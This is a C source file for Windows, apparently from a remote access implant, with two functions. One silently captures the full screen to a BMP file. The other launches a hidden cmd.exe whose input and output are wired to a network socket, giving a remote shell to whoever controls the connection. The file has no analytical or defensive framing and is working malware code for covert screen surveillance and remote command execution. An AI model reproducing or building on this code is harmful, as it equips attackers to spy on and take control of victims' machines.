#include "pch.h"
#include "framework.h"
#include "types.h"
#include "utils.h"
#include "file.h"
#include "net.h"
#include "dll_headers.h"
#include "headers.h"
#include "mylibc.h"
#include "sleaping.h"

int capture_screenshot_win32(const char* filename, gdi32_functions_t* gdi32)
{
	if (gdi32 == NULL)
	{
		return -1;
	}

	HDC hdcScreen = NULL;
	HDC hdcMemDC = NULL;
	HBITMAP hBitmap = NULL;
	HGDIOBJ hOldBitmap = NULL;
	BITMAPINFOHEADER bi;

	HANDLE hFile = INVALID_HANDLE_VALUE;
	int success = 0;

	DWORD dwBmpSize = 0;
	DWORD bytesWritten = 0;
	BYTE* lpbitmap = NULL;
	DWORD fileSize = 0;

	// Get Screen DC
	hdcScreen = GetDC(NULL);
	if (!hdcScreen)
	{
		return -1;
	}

	// Create compatible DC
	hdcMemDC = gdi32->CreateCompatibleDC(hdcScreen);
	if (!hdcMemDC)
	{
		ReleaseDC(NULL, hdcScreen);
		return -1;
	}

	int screen_width = GetSystemMetrics(SM_CXSCREEN);
	int screen_height = GetSystemMetrics(SM_CYSCREEN);

	// Create compatible bitmap
	hBitmap = gdi32->CreateCompatibleBitmap(hdcScreen, screen_width, screen_height);
	if (!hBitmap)
	{
		gdi32->DeleteDC(hdcMemDC);
		ReleaseDC(NULL, hdcScreen);
		return -1;
	}

	// Select bitmap to MemDC
	hOldBitmap = gdi32->SelectObject(hdcMemDC, hBitmap);

	// Copy screen to MemDC
	if (!gdi32->BitBlt(hdcMemDC, 0, 0, screen_width, screen_height, hdcScreen, 0, 0, SRCCOPY))
	{
		goto cleanup_0;
	}

	ZeroMemory(&bi, sizeof(BITMAPINFOHEADER));
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = screen_width;
	bi.biHeight = -screen_height;  // negative value indicates DIB from top to bottom
	bi.biPlanes = 1;
	bi.biBitCount = 24;  // 24bits color
	bi.biCompression = BI_RGB;

	dwBmpSize = ((screen_width * 24 + 31) / 32) * 4 * screen_height;
	hFile = CreateFileA(
		filename,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		goto cleanup_0;
	}

	BITMAPFILEHEADER bmfHeader;
	bmfHeader.bfType = 0x4D42;  // "BM"
	bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
	bmfHeader.bfReserved1 = 0;
	bmfHeader.bfReserved2 = 0;
	bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	// write bmp header
	if (!WriteFile(hFile, &bmfHeader, sizeof(BITMAPFILEHEADER), &bytesWritten, NULL))
	{
		goto cleanup;
	}

	// write bitmap info header
	if (!WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &bytesWritten, NULL))
	{
		goto cleanup;
	}

	// allocate mem and get bitmap data
	lpbitmap = (BYTE*)VirtualAlloc(NULL, dwBmpSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!lpbitmap)
	{
		goto cleanup;
	}

	if (!gdi32->GetDIBits(hdcScreen, hBitmap, 0, (UINT)screen_height, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS))
	{
		goto cleanup;
	}

	if (!WriteFile(hFile, lpbitmap, dwBmpSize, &bytesWritten, NULL))
	{
		goto cleanup;
	}

	// Ensure that data is written to the disk
	FlushFileBuffers(hFile);

	fileSize = GetFileSize(hFile, NULL);

	success = 1;


cleanup:

	if (lpbitmap) VirtualFree(lpbitmap, 0, MEM_RELEASE);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
	}

cleanup_0:

	if (hOldBitmap) gdi32->SelectObject(hdcMemDC, hOldBitmap);
	if (hBitmap) gdi32->DeleteObject(hBitmap);
	if (hdcMemDC) gdi32->DeleteDC(hdcMemDC);
	if (hdcScreen) ReleaseDC(NULL, hdcScreen);

	return success ? 0 : -1;
}

status_t win_cmd(SOCKET socket)
{
	status_t status = ST_SUCCESS;
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	char cmd_command[] = "cmd.exe /k chcp 65001 >nul";

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput = (HANDLE)socket;
	si.hStdOutput = (HANDLE)socket;
	si.hStdError = (HANDLE)socket;

	if (!CreateProcessA(
		NULL,
		cmd_command,
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi
	))
	{
		return ST_ERROR;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return status;
}
